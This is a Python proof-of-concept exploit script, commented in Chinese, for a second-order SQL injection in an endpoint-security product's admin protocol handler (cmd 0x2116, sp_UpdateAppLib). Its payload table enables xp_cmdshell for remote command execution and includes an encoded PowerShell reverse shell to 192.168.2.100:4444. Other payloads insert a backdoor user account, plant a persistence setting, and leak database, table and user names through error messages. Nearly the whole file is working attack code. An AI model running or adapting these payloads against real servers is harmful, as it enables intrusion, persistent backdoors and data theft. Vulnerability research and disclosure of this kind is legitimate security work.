r"""poc_vuln_g_updateapplib_sqli.py — VULN-G: cmd=0x2116 → sp_UpdateAppLib 二阶 SQLi RCE

==============================================================================
漏洞链 (真实可触发,无 gate)
==============================================================================
[OCP cmd=0x2116/sub=0 (post-auth admin)]   ← ConsoleDisposal.cpp:3604
    ↓ sub_1403E8470 (handler)
    ↓ SP dispatcher → SP id 0x00090060
sub_14062D860 (SP wire SQL builder, DBStoreProc2.cpp:0x2DC)
    ↓ SET @hash1 = N'<escape(user_input)>'                  ← 外层 escape (' → '')
    ↓ ... (其他无害 SQL)
    ↓ SET @cond = N'APP_HASH1 = N''' + @hash1 + N''''       ← @hash1 字面拼 @cond
    ↓ EXEC sp_UpdateAppLib @cond=@cond
sp_UpdateAppLib (SP installed in DB)
    ↓ SET @sql = N'... INSERT INTO @_tmp SELECT ... WHERE ' + @cond + N'... UPDATE ...'
    ↓ EXEC(@sql)                                             ← ★ 注入点 ★

二次解析破除原理:
  用户输入: foo'; EXEC xp_cmdshell N'calc.exe'--
  外层 escape: foo''; EXEC xp_cmdshell N''calc.exe''--
  SQL Server 绑定 @hash1 = foo'; EXEC xp_cmdshell N'calc.exe'--  (含字面 ')
  @cond 字面构造 = APP_HASH1 = N'foo'; EXEC xp_cmdshell N'calc.exe'--'
  sp_UpdateAppLib 拼 @sql:
    ... FROM APP_LIB WHERE APP_HASH1 = N'foo'; EXEC xp_cmdshell N'calc.exe'--
                                       └─── N-literal 闭合
                                                              └── 独立 SQL 语句 → RCE
                                                                                       └── 注释吃剩余

==============================================================================
对比 VULN-F (不可触发) vs VULN-G (可触发)
==============================================================================
| 项                  | VULN-F p_dirtree     | VULN-G sp_UpdateAppLib   |
|---|---|---|
| Gate 检查           | ★ xp_fileexist 拦截  | ✅ 无                    |
| 参数大小            | nvarchar(255)        | nvarchar(255) → @cond(1000) |
| 注入位置            | INSERT…EXEC          | 普通 EXEC                |
| Batch abort 风险    | 高                   | 低                       |
| 实测可触发性        | ❌                    | ✅ (本 PoC 验证)         |

==============================================================================
OCP body 格式 (从 sub_1403E8470 反编译推导)
==============================================================================
  +0   WORD  hash1_len (wide chars, must > 0)
  +2   WORD  0 (padding)
  +4   DWORD classID
  +8   DWORD desc_set_flag (0=不更新 desc, 非 0=更新)
  +12  WORD  desc_len (wide chars; 0=无 desc)
  +14  WORD  0 (padding)
  +16  wcs   hash1[hash1_len]   ← ★ SQLi 注入点 ★
  +16+2L1 WORD 0 (NUL)
  +18+2L1 wcs desc[desc_len]
  +18+2L1+2L2 WORD 0 (NUL)
  Total: 20 + 2*(hash1_len + desc_len)

OCP flags: 0x4600

注意: SP 参数 @hash1 为 NVARCHAR(255), 超出部分被截断.
      注入 payload 实际可用长度 = 255 − len("foo'; ") = ~249 wide chars.
      @cond 上限 NVARCHAR(1000), hash1→cond 增量 = 14 (前缀) + 1 (后引号).

用法:
    python3 poc_vuln_g_updateapplib_sqli.py <host> <port> <user> <pwd> [kind]
"""
import os, socket, struct, sys, time, io
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

if sys.platform == "win32" and hasattr(sys.stdout, "buffer"):
    sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding="utf-8", errors="replace")
    sys.stderr = io.TextIOWrapper(sys.stderr.buffer, encoding="utf-8", errors="replace")

from ipguard_login.login import replay_login, SESSION_FP_DEFAULT
from ipguard_login.packet import (
    build_packet_with_state, recv_full_packet, parse_packet,
)


# ── payload 构造助手 ──────────────────────────────────────────────────────────

# RCE payload: 自启用 xp_cmdshell + 执行命令
_ENABLE = (
    r"EXEC sp_configure N'show advanced options',1; RECONFIGURE; "
    r"EXEC sp_configure N'xp_cmdshell',1; RECONFIGURE; "
)

def _rce(cmd: str) -> str:
    """完整 RCE: hash1 闭合 N'...' 后注入 enable + xp_cmdshell."""
    return f"foo'; {_ENABLE}EXEC xp_cmdshell N'{cmd}'--"

def _rce_minimal(cmd: str) -> str:
    """假设 xp_cmdshell 已启用, 最小注入."""
    return f"foo'; EXEC xp_cmdshell N'{cmd}'--"

def _sql(stmt: str) -> str:
    """纯 SQL 注入 (不需 xp_cmdshell)."""
    return f"foo'; {stmt}--"


# ── payload 表 ────────────────────────────────────────────────────────────────
# 各条目字段说明:
#   desc       — 供显示用的 payload 简介
#   hash1      — 注入字符串 (发送给 OCP body 的 hash1 字段)
#   classID    — OCP body classID (通常=1)
#   body_desc  — OCP body desc 字段的实际内容 (通常为空串)
#   expected   — 期望结果
#   verify     — 验证命令 (可选)
#   cleanup    — 清理命令 (可选)

PAYLOADS = {
    # ── 触达验证 ────────────────────────────────────────────────────────────
    "test": {
        "desc":      "良性触达 — hash1=任意普通字符串, 看响应",
        "hash1":     "BENIGN_TEST_HASH_NOT_EXIST",
        "classID":   1,
        "body_desc": "",
        "expected":  "SP 跑通(可能 0 rows matched),无错误响应",
    },
    "syntax_probe": {
        "desc":      "语法探针 — 单引号看是否触发 sp_UpdateAppLib EXEC(@sql) 错误",
        "hash1":     "A'B",
        "classID":   1,
        "body_desc": "",
        "expected":  "SQL Server EXEC 解析错(N-literal 提前闭合),返回错误响应",
    },

    # ── RCE 类 (自启用 xp_cmdshell) ─────────────────────────────────────────
    "drop": {
        "desc":      "RCE — PS Set-Content 写文件 (自启用 xp_cmdshell)",
        "hash1":     _rce(r"powershell -nop -c Set-Content -Path C:\Windows\Temp\IPGuard_VULN_G.txt -Value OWNED-VULN-G"),
        "classID":   1,
        "body_desc": "",
        "expected":  "C:\\Windows\\Temp\\IPGuard_VULN_G.txt 落地, 内容=OWNED-VULN-G",
        "verify":    "type C:\\Windows\\Temp\\IPGuard_VULN_G.txt",
    },
    "pwn": {
        "desc":      "RCE — calc.exe (自启用)",
        "hash1":     _rce(r"powershell -nop -c Start-Process calc"),
        "classID":   1,
        "body_desc": "",
        "expected":  "SQL Server host 启动 calc.exe",
        "verify":    "Get-Process calc",
    },
    "whoami": {
        "desc":      "RCE — whoami 写入文件 (验证执行身份)",
        "hash1":     _rce(r"powershell -nop -c whoami | Set-Content C:\Windows\Temp\IPGuard_VULN_G_whoami.txt"),
        "classID":   1,
        "body_desc": "",
        "expected":  "C:\\Windows\\Temp\\IPGuard_VULN_G_whoami.txt 含服务账号身份",
        "verify":    "type C:\\Windows\\Temp\\IPGuard_VULN_G_whoami.txt",
    },
    "rev_shell": {
        "desc":      "RCE — PowerShell 反弹 shell (改 IP/port; -enc 内嵌, 注意长度>255会截断)",
        "hash1":     _rce(
            r"powershell -nop -w hidden -enc "
            r"JABjAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBTAG8AYwBrAGUAdABzAC4A"
            r"VABDAFAAQwBsAGkAZQBuAHQAKAAnADEAOQAyAC4AMQA2ADgALgAyAC4AMQAwADAAJwAsADQANAA0ADQAKQA7ACQA"
            r"cwA9ACQAYwAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAPQAwAC4ALgA2ADUA"
            r"NQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAPQAkAHMALgBSAGUAYQBkACgAJABiACwAMAAsACQA"
            r"YgAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAJABkAD0AKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAA"
            r"LQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkA"
            r"bgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgAsADAALAAkAGkAKQA7ACQAcgA9ACgAaQBlAHgAIAAkAGQA"
            r"IAAyAD4AJgAxAHwATwB1AHQALQBTAHQAcgBpAG4AZwApADsAJABzAGIAPQAoAFsAdABlAHgAdAAuAGUAbgBjAG8A"
            r"ZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcgApADsAJABzAC4AVwByAGkA"
            r"dABlACgAJABzAGIALAAwACwAJABzAGIALgBMAGUAbgBnAHQAaAApADsAJABzAC4ARgBsAHUAcwBoACgAKQB9AA=="
        ),
        "classID":   1,
        "body_desc": "",
        "expected":  "反弹到 192.168.2.100:4444 (修改 base64 中的 IP/port 后使用)",
        "verify":    "在监听机跑: nc -lvnp 4444",
    },

    # ── 纯 SQL 注入 ──────────────────────────────────────────────────────────
    # 注: 使用未限定表名,依赖 OServer3 连接时已 USE <db>
    "insert_user": {
        "desc":      "INSERT — 新建后门用户 (USR_ID=99999)",
        "hash1":     _sql(
            r"INSERT INTO [USER] (USR_ID, USR_NAME, USR_ALIAS, USR_GRP_ID, USR_DELETE) "
            r"VALUES (99999, N'backdoor', N'Backdoor SU', 1, 0)"
        ),
        "classID":   1,
        "body_desc": "",
        "expected":  "[USER] 表新增 ID=99999",
        "verify":    "SELECT * FROM [USER] WHERE USR_ID=99999",
        "cleanup":   "DELETE FROM [USER] WHERE USR_ID=99999",
    },
    "enable_dirtree": {
        "desc":      "持久化 — SYS_CFG 写 p_dirtree=1 (下次 OServer3 重启装危险版 SP)",
        "hash1":     _sql(
            r"IF EXISTS (SELECT 1 FROM SYS_CFG WHERE SC_NAME=N'p_dirtree') "
            r"UPDATE SYS_CFG SET SC_INT=1 WHERE SC_NAME=N'p_dirtree' "
            r"ELSE INSERT INTO SYS_CFG (SC_NAME, SC_INT) VALUES (N'p_dirtree', 1)"
        ),
        "classID":   1,
        "body_desc": "",
        "expected":  "SYS_CFG 中 p_dirtree=1 (下次启动装危险版)",
        "verify":    "SELECT SC_NAME, SC_INT FROM SYS_CFG WHERE SC_NAME=N'p_dirtree'",
    },
    "version_dump": {
        "desc":      "诊断 — 写 @@VERSION 到 __pwn 表 (确认注入到达 SQL Server 端)",
        "hash1":     _sql(
            r"IF OBJECT_ID(N'dbo.__pwn',N'U') IS NULL "
            r"CREATE TABLE __pwn (V NVARCHAR(MAX)); "
            r"INSERT INTO __pwn (V) "
            r"VALUES (@@VERSION + N' / sysadmin=' + CAST(IS_SRVROLEMEMBER(N'sysadmin') AS NVARCHAR(10)) "
            r"+ N' / DB=' + DB_NAME() + N' / user=' + SYSTEM_USER)"
        ),
        "classID":   1,
        "body_desc": "",
        "expected":  "__pwn 表创建 + 含 SQL Server 版本 / sysadmin 标志 / 当前 DB 名 / 当前 user",
        "verify":    "SELECT * FROM __pwn",
        "cleanup":   "DROP TABLE __pwn",
    },

    # ── 带内数据外泄 (in-band, CONVERT→INT 错误回显) ─────────────────────────
    # 原理: CONVERT(INT, nvarchar) 失败时 SQL Server 错误消息携带原始字符串值
    #       错误消息路径: SQL Server → ODBC → ADO → OServer3 → OCP 响应 plain
    "leak_version": {
        "desc":      "★ 带内泄露 — @@VERSION + sysadmin标志 + 当前user (CONVERT错误回显)",
        "hash1":     _sql(
            r"DECLARE @v NVARCHAR(2000)=N'PWN:'+@@VERSION"
            r"+N'|sa='+CAST(IS_SRVROLEMEMBER(N'sysadmin') AS NVARCHAR(10))"
            r"+N'|user='+SYSTEM_USER;"
            r"SELECT CONVERT(INT, @v)"
        ),
        "classID":   1,
        "body_desc": "",
        "expected":  "★ 响应/错误消息里含 PWN: 前缀 + SQL Server 版本 + sysadmin + user",
        "verify":    "直接看 PoC 输出, 应有 ADO 错误消息含 PWN: 前缀的数据",
    },
    "leak_db": {
        "desc":      "★ 带内泄露 — 当前 DB 名 + 所有 DB 列表 (先跑这个,确认库名)",
        "hash1":     _sql(
            r"DECLARE @v NVARCHAR(2000)=N'CURRENT_DB='+DB_NAME()+N'|ALL_DBs:'"
            r"+ISNULL(STUFF((SELECT N','+name FROM sys.databases FOR XML PATH(N'')),1,1,N''),N'<empty>');"
            r"SELECT CONVERT(INT, @v)"
        ),
        "classID":   1,
        "body_desc": "",
        "expected":  "★ 错误消息含 CURRENT_DB=<真实库名>|ALL_DBs:master,tempdb,...",
        "verify":    "看 PoC 输出",
    },
    "leak_dbname": {
        "desc":      "★ 带内泄露 — 所有 DB 列表 (同 leak_db, 简化版)",
        "hash1":     _sql(
            r"DECLARE @v NVARCHAR(2000)=N'DBs:'"
            r"+STUFF((SELECT N','+name FROM sys.databases FOR XML PATH(N'')),1,1,N'');"
            r"SELECT CONVERT(INT, @v)"
        ),
        "classID":   1,
        "body_desc": "",
        "expected":  "★ 错误消息含 DBs:master,tempdb,model,msdb,...",
        "verify":    "看 PoC 输出",
    },
    "leak_users": {
        "desc":      "★ 带内泄露 — [USER] 表前3行 (id:name, 用当前DB context)",
        "hash1":     _sql(
            r"DECLARE @v NVARCHAR(2000)=N'USERS:'"
            r"+ISNULL(STUFF((SELECT TOP 3 N','+CAST(USR_ID AS NVARCHAR(10))+N':'+USR_NAME"
            r" FROM [USER] FOR XML PATH(N'')),1,1,N''),N'<empty>');"
            r"SELECT CONVERT(INT, @v)"
        ),
        "classID":   1,
        "body_desc": "",
        "expected":  "★ 错误消息含 USERS:id:name,...",
        "verify":    "看 PoC 输出",
    },
    "leak_xpcmdshell_status": {
        "desc":      "诊断 — 检查 xp_cmdshell 是否启用 (in-band)",
        "hash1":     _sql(
            r"DECLARE @v NVARCHAR(200)=N'xp_cmdshell.value_in_use='"
            r"+CAST((SELECT value_in_use FROM sys.configurations WHERE name=N'xp_cmdshell') AS NVARCHAR(10));"
            r"SELECT CONVERT(INT, @v)"
        ),
        "classID":   1,
        "body_desc": "",
        "expected":  "错误消息含 xp_cmdshell.value_in_use=0 或 =1",
        "verify":    "看 PoC 输出",
    },
    "leak_tables": {
        "desc":      "★ 带内泄露 — 当前 DB 所有用户表名 (确认 schema)",
        "hash1":     _sql(
            r"DECLARE @v NVARCHAR(2000)=N'TABLES:'"
            r"+ISNULL(STUFF((SELECT N','+name FROM sys.tables ORDER BY name FOR XML PATH(N'')),1,1,N''),N'<empty>');"
            r"SELECT CONVERT(INT, @v)"
        ),
        "classID":   1,
        "body_desc": "",
        "expected":  "★ 错误消息含 TABLES:APP_LIB,SYS_CFG,[USER],...",
        "verify":    "看 PoC 输出",
    },
}


# ── OCP body 构造 ─────────────────────────────────────────────────────────────

def build_body_2116(hash1: str, classID: int = 1, body_desc: str = "") -> bytes:
    """构造 cmd=0x2116 OCP body.

    格式:
      +0  WORD  hash1_len  (wide chars, 不含 NUL)
      +2  WORD  0          (padding)
      +4  DWORD classID
      +8  DWORD desc_set_flag  (0=不更新 desc, 1=更新)
      +12 WORD  desc_len   (wide chars, 不含 NUL)
      +14 WORD  0          (padding)
      +16 wcs   hash1 + NUL (2 bytes)
      +.. wcs   body_desc + NUL (2 bytes)
    """
    hash1_wcs = hash1.encode("utf-16-le")
    h_len     = len(hash1_wcs) // 2
    desc_wcs  = body_desc.encode("utf-16-le")
    d_len     = len(desc_wcs) // 2

    hdr  = struct.pack("<HHIIHH", h_len, 0, classID, 1 if body_desc else 0, d_len, 0)
    body = hdr + hash1_wcs + b"\x00\x00" + desc_wcs + b"\x00\x00"
    return body


# ── 网络层 ────────────────────────────────────────────────────────────────────

def fresh_send(host, port, user, pwd, body, cmd=0x2116, sub=0,
               flags=0x4600, timeout=15.0):
    """登录 → 发 OCP 包 → 返回解析后的响应 dict."""
    base_nonce = struct.unpack("<I", os.urandom(3) + b"\x00")[0] | 0x00100000
    s = None
    try:
        s = socket.create_connection((host, port), timeout=timeout)
        s.settimeout(timeout)
        idx, role, tok, _ = replay_login(s, user, pwd, base_nonce,
                                         show_crypto=False, verbose=False)
        # cmd=0x2116 需要 perm 0x91(145) 或 0x92(146) → 由 role 位掩码决定
        # 常见: role=0 普通用户被拦, role>=0x80 通常是管理员
        perm_ok = bool(role & 0x91) or bool(role & 0x92)
        perm_warn = "" if perm_ok else "  ⚠️  role 不含 0x91/0x92 → ACL 将拦截!"
        print(f"    [+] login OK  role=0x{role:04x}({role})  tok=0x{tok:x}{perm_warn}")
        nxt = (base_nonce + idx) & 0xFFFFFFFF
        pkt = build_packet_with_state(
            flags=flags, a2=cmd, a3=sub, nonce=nxt,
            sess_state_16_24=struct.pack("<II", role, tok),
            fp_lo=SESSION_FP_DEFAULT, fp_hi=SESSION_FP_DEFAULT,
            plain=body)
        print(f"    [+] sending {len(pkt)}B  "
              f"(cmd=0x{cmd:04x}/sub={sub}  flags=0x{flags:04x}  body={len(body)}B)")
        s.sendall(pkt)
        try:
            return parse_packet(recv_full_packet(s))
        except (socket.timeout, ConnectionError, OSError) as e:
            return {"_err": f"recv: {e}"}
    except Exception as e:
        return {"_err": f"send: {e}"}
    finally:
        if s:
            try: s.close()
            except: pass


# ── 响应分析 ──────────────────────────────────────────────────────────────────

def extract_ascii_strings(buf: bytes, min_len: int = 6) -> list:
    """从二进制提取可见 ASCII 字符串."""
    out, cur = [], bytearray()
    for b in buf:
        if 32 <= b < 127:
            cur.append(b)
        else:
            if len(cur) >= min_len:
                out.append(cur.decode("ascii", errors="replace"))
            cur = bytearray()
    if len(cur) >= min_len:
        out.append(cur.decode("ascii", errors="replace"))
    return out


def extract_wcs_strings(buf: bytes, min_len: int = 6) -> list:
    """从二进制按 UTF-16-LE 提取可见字符串."""
    out, cur = [], []
    i = 0
    while i + 1 < len(buf):
        ch = buf[i] | (buf[i+1] << 8)
        if 32 <= ch < 0xD800 or 0xE000 <= ch < 0xFFFE:
            cur.append(ch)
        else:
            if len(cur) >= min_len:
                try:
                    out.append("".join(chr(c) for c in cur))
                except Exception:
                    pass
            cur = []
        i += 2
    if len(cur) >= min_len:
        try:
            out.append("".join(chr(c) for c in cur))
        except Exception:
            pass
    return out


# SQL Server 错误特征签名
SQL_ERROR_SIGNATURES = [
    ("Conversion failed",        "🎯 CONVERT 失败 — 错误消息里通常含我们的原始数据"),
    ("converting the nvarchar",  "🎯 nvarchar→int CONVERT 错误,数据在前面"),
    ("Incorrect syntax",         "❌ SQL 语法错误 — 注入构造有问题"),
    ("Invalid column name",      "❌ 列名错误"),
    ("Invalid object name",      "❌ 对象不存在(可能 DB 名/表名错)"),
    ("PWN:",                     "🎯 ★★ PWN: 标记数据已回流!"),
    ("DBs:",                     "🎯 ★★ DB 列表数据回流"),
    ("USERS:",                   "🎯 ★★ 用户名数据回流"),
    ("TABLES:",                  "🎯 ★★ 表名列表数据回流"),
    ("CURRENT_DB=",              "🎯 ★★ 当前 DB 名回流"),
    ("xp_cmdshell.value_in_use", "🎯 xp_cmdshell 状态回流"),
    ("syntax error",             "❌ SQL 语法错误"),
    ("sysadmin",                 "🎯 sysadmin 角色信息回流"),
    ("near",                     "⚠️  SQL 解析错误附近上下文"),
]


def analyze_response(resp, kind: str, p: dict):
    print()
    if not resp or "_err" in resp:
        err = resp.get("_err") if resp else "None"
        print(f"[!] 传输/解析错误: {err}")
        return

    fl    = resp.get("flags", 0)
    plen  = resp.get("payload_len", 0)
    plain = resp.get("plain", b"")
    print(f"[*] flags=0x{fl:04x}  plen={plen}  plain_len={len(plain)}")

    if plain:
        print(f"[*] plain hex (前128B): {plain[:128].hex()}{'...' if len(plain) > 128 else ''}")

    # OCP 响应头 DWORD@0 状态码
    if len(plain) >= 4:
        status = struct.unpack("<I", plain[0:4])[0]
        ERROR_CODES = {
            0:      "SUCCESS",
            0xF002: "PRIVATE_ERR / 鉴权失败",
            0xF003: "NOT_AUTHORIZED",
            0xF004: "SP_FAILED",
            0xF005: "INVALID_INPUT",
            16:     "INPUT_BAD",
            48:     "EXEC_FAILED",
        }
        label = ERROR_CODES.get(status, "")
        print(f"[*] response status (DWORD@0) = 0x{status:08x} ({status})"
              + (f"  → {label}" if label else ""))

    # ★ 字符串提取 + SQL 签名扫描
    ascii_strs = extract_ascii_strings(plain, min_len=8) if plain else []
    wcs_strs   = extract_wcs_strings(plain, min_len=6)   if plain else []
    all_strs   = ascii_strs + wcs_strs

    if all_strs:
        print(f"\n[*] 提取的可见字符串 ({len(all_strs)} 个):")
        for s in all_strs[:20]:
            print(f"     • {s[:240]}{'...' if len(s) > 240 else ''}")

        joined = " | ".join(all_strs)
        hits = [(sig, hint) for sig, hint in SQL_ERROR_SIGNATURES
                if sig.lower() in joined.lower()]
        if hits:
            print(f"\n[*] SQL 签名命中:")
            for sig, hint in hits:
                print(f"     {hint}  (匹配: {sig!r})")

    # ── 按 kind 给结论 ─────────────────────────────────────────────────────
    print()
    print("=" * 70)

    if kind == "test":
        if plen > 0 or fl == 0xc801:
            print("✅ 触达成功 — cmd=0x2116 链路通,可继续测 SQLi/RCE payload")
        elif plen == 0 and fl & 0x0800:
            print("⚠️  ACL 拦截 (flags 含 0x0800/error bit, plen=0) — 权限不足")
        else:
            print("⚠️  响应空,可能 body 格式或鉴权问题")

    elif kind == "syntax_probe":
        raw = str(plain).lower()
        has_sql_err = any(k in raw for k in ["syntax", "incorrect", "near", "convert"])
        if has_sql_err:
            print("✅ ★ 二次解析破除证实 — 响应含 SQL 错误消息,注入面打开")
        elif plen == 0:
            print("⚠️  plen=0 — 无法判定是 SQL 错还是 SP 提前 bail / ACL 拦截")
        else:
            print("⚠️  无明显错误标志 — 可能 @hash1='A''B' 仅查找不存在 hash 且正常返回")

    elif kind.startswith("leak_"):
        MARKERS = ["PWN:", "DBs:", "USERS:", "TABLES:", "CURRENT_DB=", "xp_cmdshell"]
        found = []
        joined_all = plain.decode("utf-16-le", errors="replace") + " " + \
                     plain.decode("latin-1", errors="replace")
        for m in MARKERS:
            if m in joined_all or any(m in s for s in all_strs):
                found.append(m)
        if found:
            print(f"🎯🎯🎯 ★ 带内数据泄露成功 — 含标记: {found}")
            print("   VULN-G SQL 注入 100% 确认 + 可读 SQL Server 内部数据")
        else:
            print("⚠️  没看到预期标记,可能:")
            print("   - SQL CONVERT 错误消息未被 OServer3 透传 (被压在 plen=0)")
            print("   - ACL 拦截导致注入未执行 (先跑 test 确认触达)")
            print("   - 注入 SQL 语法有误 (跑 syntax_probe 确认二次解析)")
            print("   → 改试 version_dump (走 INSERT 写表,再用 SSMS 查)")

    else:  # drop / pwn / whoami / rce 类
        if plen == 0:
            print("🟡 plen=0 — payload 已发送,但响应空")
            print("   可能: SP 内部 EXEC 报错 / xp_cmdshell 未启用")
            print("   关键验证: 到目标主机执行上面的 verify 命令")
        else:
            print(f"🟢 plen={plen} 非 0 — 注意上面字符串中有无我们的标记/SQL 错")


def print_verify(p: dict):
    print()
    print("=" * 70)
    print("验证步骤:")
    if "verify" in p:
        print(f"  {p['verify']}")
    if "cleanup" in p:
        print(f"\n清理 (测试完毕后执行):")
        print(f"  {p['cleanup']}")
    print()
    print("SQL Profiler 应该看到:")
    print("  1) 外层 EXEC sp_UpdateAppLib @cond=... 调用")
    print("  2) 内层 sp_UpdateAppLib 的 EXEC(@sql) 含我们的注入片段")
    print("  3) 如果启用了 xp_cmdshell, 会有 master.dbo.xp_cmdshell 调用")
    print("=" * 70)


# ── 入口 ─────────────────────────────────────────────────────────────────────

def main():
    if len(sys.argv) < 5:
        print(__doc__)
        print("\nAvailable payloads:")
        for k, v in PAYLOADS.items():
            print(f"  {k:<26} {v['desc']}")
        sys.exit(1)

    host = sys.argv[1]
    port = int(sys.argv[2])
    user = sys.argv[3]
    pwd  = sys.argv[4]
    kind = sys.argv[5] if len(sys.argv) >= 6 else "test"

    if kind not in PAYLOADS:
        print(f"[!] unknown payload: {kind!r}")
        print(f"    available: {', '.join(PAYLOADS.keys())}")
        sys.exit(1)

    p = PAYLOADS[kind]

    print("=" * 70)
    print("VULN-G PoC — cmd=0x2116 → sp_UpdateAppLib 二阶 SQLi")
    print("=" * 70)
    print(f"[*] target:    {host}:{port}")
    print(f"[*] user:      {user!r}")
    print(f"[*] payload:   {kind} — {p['desc']}")
    print(f"[*] classID:   {p['classID']}")
    print(f"[*] expected:  {p['expected']}")
    print()

    h1   = p["hash1"]
    h1_l = len(h1)
    print(f"[*] hash1 ({h1_l} wchars):")
    print(f"     原始:   {h1!r}")
    print(f"     escaped: N'{h1.replace(chr(39), chr(39)*2)}'")
    print(f"     @cond:  APP_HASH1 = N'{h1}'")

    # 长度警告
    SP_PARAM_LIMIT = 255
    if h1_l > SP_PARAM_LIMIT:
        print(f"\n  ⚠️  WARNING: hash1 长度 {h1_l} > SP @hash1 限制 {SP_PARAM_LIMIT} wchars")
        print(f"              超出部分将被截断! payload 可能无法完整执行.")
    print()

    body = build_body_2116(h1, p["classID"], p.get("body_desc", ""))
    print(f"[*] body: {len(body)}B = {body.hex()[:120]}{'...' if len(body.hex()) > 120 else ''}")
    print()

    t0   = time.time()
    resp = fresh_send(host, port, user, pwd, body)
    dt   = time.time() - t0
    print(f"[*] elapsed {dt:.2f}s")

    analyze_response(resp, kind, p)
    print_verify(p)


if __name__ == "__main__":
    main()
